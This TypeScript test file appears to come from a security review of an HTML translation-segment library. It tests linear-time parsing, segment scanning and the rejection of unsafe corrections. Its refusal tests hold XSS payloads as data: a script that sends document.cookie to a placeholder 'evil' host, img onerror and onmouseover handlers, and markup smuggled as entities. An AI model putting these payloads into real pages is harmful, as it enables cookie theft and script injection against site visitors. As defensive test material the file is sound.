// Cases from the security review: linear time on crafted documents, segment reading that
// follows HTML, and corrections that must never get through.
import { describe, expect, it } from 'vitest'
import { checkCorrection, hasTextOutsideSegments, htmlToText, isSafeSegmentContent, normalizeSegmentHtml, replaceSegments, scanSegments, tokens } from '../src/index'

const MB = 1_000_000

/** Runs fn and returns the milliseconds it took. */
function time(fn: () => unknown): number {
  const t = Date.now()
  fn()
  return Date.now() - t
}

describe('linear time on 1 MB of crafted input', () => {
  const inputs: Record<string, string> = {
    'unclosed data-st-id tags': '<a data-st-id=1 '.repeat(MB / 16),
    'unclosed segment elements': '<div data-st-id=1>'.repeat(MB / 18),
    'tag starts without >': '<a '.repeat(MB / 3),
    'comment starts': '<!--'.repeat(MB / 4),
    'paragraph starts': '<p '.repeat(MB / 3),
    'open divs then stray end tags': '<div>'.repeat(MB / 10) + '</span>'.repeat(MB / 14),
    'script starts': '<script>'.repeat(MB / 8),
    'quotes': '<a title="'.repeat(MB / 10),
    'entities': '&#x1'.repeat(MB / 4),
    'spaces then text': ' '.repeat(MB) + 'x',
  }
  for (const [name, html] of Object.entries(inputs)) {
    it(name, () => {
      const ms = time(() => {
        scanSegments(html)
        hasTextOutsideSegments(html)
        htmlToText(html)
        normalizeSegmentHtml(html)
        checkCorrection(html.slice(0, 100_000), html.slice(0, 100_000))
      })
      expect(ms).toBeLessThan(2000)
    })
  }
})

describe('segments follow HTML', () => {
  it('ignores end tags inside comments and scripts, and quoted >', () => {
    const html = '<div data-st-id="0" title="a>b">see <!-- </div> --> more <script>"</div>"</script></div><div data-st-id="1">x</div>'
    expect(scanSegments(html).map((s) => [s.id, s.inner])).toEqual([
      ['0', 'see <!-- </div> --> more <script>"</div>"</script>'],
      ['1', 'x'],
    ])
  })

  it('reads data-st-id only as an attribute', () => {
    expect(scanSegments('<p title=" data-st-id=5">x</p>')).toEqual([])
  })

  it('counts loose text but not head, scripts, comments or segments', () => {
    expect(hasTextOutsideSegments('<html><head><title>T</title><style>p{}</style></head><body><!-- c --><div data-st-id="0">x</div></body></html>')).toBe(false)
    expect(hasTextOutsideSegments('<body><p>Loose</p><div data-st-id="0">x</div></body>')).toBe(true)
    expect(hasTextOutsideSegments('<body>&nbsp;<div data-st-id="0">x</div></body>')).toBe(false)
  })

  it('tells safe segment content from content that breaks the element', () => {
    expect(isSafeSegmentContent('Hello <b>world</b>')).toBe(true)
    expect(isSafeSegmentContent('a</div><div>b')).toBe(false)
    expect(isSafeSegmentContent('<div>open')).toBe(false)
    expect(isSafeSegmentContent('<script>')).toBe(false)
    expect(isSafeSegmentContent('<!-- open')).toBe(false)
  })

  it('replaceSegments keeps the rest of the document byte for byte', () => {
    const html = '<p>a</p><div data-st-id="0">x</div><p>b</p>'
    expect(replaceSegments(html, scanSegments(html), () => 'y')).toBe('<p>a</p><div data-st-id="0">y</div><p>b</p>')
  })

  it('tokenizes an unfinished tag as one token to the end', () => {
    expect(tokens('a <b title="x').map((t) => t.type)).toEqual(['text', 'unterminated'])
  })
})

describe('corrections that must be refused', () => {
  const codes = (source: string, correction: string, ai?: string) => checkCorrection(source, correction, ai).map((p) => p.code)

  it('script and style bodies, even when the source has them', () => {
    expect(codes('<script>track()</script> Hello', '<script>fetch("//evil/"+document.cookie)</script> Hallo')).toContain('forbidden_tag')
    expect(codes('<style>p{}</style> Hi', '<style>body{display:none}</style> Hallo')).toContain('forbidden_tag')
  })

  it('tags that occur only inside comments or scripts of the source', () => {
    expect(codes('Hi <!-- <iframe src="https://old.example/embed"></iframe> --> there', '<iframe src="https://old.example/embed"></iframe>')).toContain('forbidden_tag')
    expect(codes('<script>document.write("<img src=x onerror=alert(1)>")</script>Hi', '<img src=x onerror=alert(1)>')).toEqual(['unknown_tag'])
  })

  it('unbalanced, extra and misnested tags', () => {
    const src = 'Read <a href="https://example.ch/guide">the guide</a>.'
    expect(codes(src, 'Lies <a href="https://example.ch/guide">die Anleitung')).toEqual(['unbalanced'])
    expect(codes(src, '</a></a>')).toEqual(['unbalanced', 'unbalanced'])
    expect(codes('<div>Intro</div> more', '<div>Einleitung mehr')).toEqual(['unbalanced'])
    expect(codes('<div>Intro</div> more', '</div><div>Einleitung</div> mehr')).toContain('unbalanced')
    expect(codes('<b>x</b>', '<b>a</b><b>b</b>')).toEqual(['unknown_tag'])
    expect(codes('<b><i>x</i></b>', '<b><i>x</b></i>')).toContain('unbalanced')
  })

  it('attributes on end tags and other whitespace', () => {
    expect(codes('<b>x</b>', '<b>y</b title="<img src=x onerror=alert(1)>">')).toContain('end_tag_attributes')
    expect(codes('<a title=foo onmouseover=alert(1)>x</a>', '<a title=foo onmouseover=alert(1)>y</a>')).toEqual(['unknown_tag'])
  })

  it('markup smuggled as entities', () => {
    expect(codes('Title', '&lt;img src=x onerror=alert(1)&gt;')).toContain('encoded_markup')
    expect(codes('Title', '1 &lt; 2 and 3 &gt; 2')).toEqual([])
  })

  it('accepts the source’s tags, translated attributes from the AI answer, and br', () => {
    const src = 'See <img src="/a.png" alt="A cat"> and <a href="/en/x">this</a>.'
    const ai = 'Siehe <img src="/a.png" alt="Eine Katze"> und <a href="/de/x">das</a>.'
    expect(codes(src, 'Schau <img src="/a.png" alt="Eine Katze"><br>und <a href="/de/x">hier</a>.', ai)).toEqual([])
    expect(codes(src, 'Schau <img src="/a.png" alt="Eine Katze">', undefined)).toEqual(['unknown_tag'])
  })
})

describe('second review round', () => {
  it('never treats script, style or other raw-text elements as segments', () => {
    const html = '<script type="application/ld+json" data-st-id="1">{"name":"Welcome"}</script><style data-st-id="2">p{}</style><textarea data-st-id="3">x</textarea><div data-st-id="4">ok</div>'
    expect(scanSegments(html).map((s) => s.id)).toEqual(['4'])
  })

  it('decodes zero-padded entities and refuses incomplete ones in corrections', () => {
    const codes = (c: string) => checkCorrection('Title', c).map((p) => p.code)
    expect(codes('&#00000000060;img src=x onerror=alert(1)&#00000000062;')).toContain('encoded_markup')
    expect(codes('&#x00000003c;img src=x&#x00000003e;')).toContain('encoded_markup')
    expect(codes('&lt img src=x onerror=alert(1)&gt')).toContain('encoded_markup')
    expect(codes('&#60 img')).toContain('encoded_markup')
    expect(codes('AT&amp;T, M&uuml;ller &amp; S&ouml;hne, 1 &lt; 2')).toEqual([])
  })

  it('ignores tags inside noscript and template in the source', () => {
    expect(checkCorrection('<noscript><img src=x onerror=alert(1)></noscript>Hi', 'Hallo <img src=x onerror=alert(1)>').map((p) => p.code)).toEqual(['unknown_tag'])
    expect(checkCorrection('<template><b>x</b></template>Hi', '<b>Hallo</b>').map((p) => p.code)).toEqual(['unknown_tag'])
  })

  it('ends the head at the first body content, with or without </head>', () => {
    expect(hasTextOutsideSegments('<html><head><title>t</title><body><h1>Loose heading</h1><div data-st-id="0">Seg</div></body></html>')).toBe(true)
    expect(hasTextOutsideSegments('<html><head><title>t</title><h1>Loose</h1><div data-st-id="0">Seg</div>')).toBe(true)
    expect(hasTextOutsideSegments('<html><head><meta charset="utf-8"><title>t</title></head><body><div data-st-id="0">Seg</div></body></html>')).toBe(false)
    // Text in an unclosed noscript counts as visible: the safe direction.
    expect(hasTextOutsideSegments('<body><noscript>Enable JS<div data-st-id="0">Seg</div></body>')).toBe(true)
  })

  it('ends comments like browsers', () => {
    expect(scanSegments('<!--><div data-st-id="0">A</div><!-- x -->').map((s) => s.id)).toEqual(['0'])
    expect(scanSegments('<!---><div data-st-id="0">A</div>').map((s) => s.id)).toEqual(['0'])
    expect(scanSegments('<!-- a --!><div data-st-id="0">A</div>').map((s) => s.id)).toEqual(['0'])
  })

  it('stays linear on zero-padded entities and comment variants', () => {
    for (const html of ['&#' + '0'.repeat(1_000_000), '&#0'.repeat(300_000), '<!--'.repeat(250_000) + '--!>', '&lt'.repeat(300_000)]) {
      const t = Date.now()
      htmlToText(html)
      checkCorrection('x', html.slice(0, 100_000))
      expect(Date.now() - t).toBeLessThan(2000)
    }
  })
})
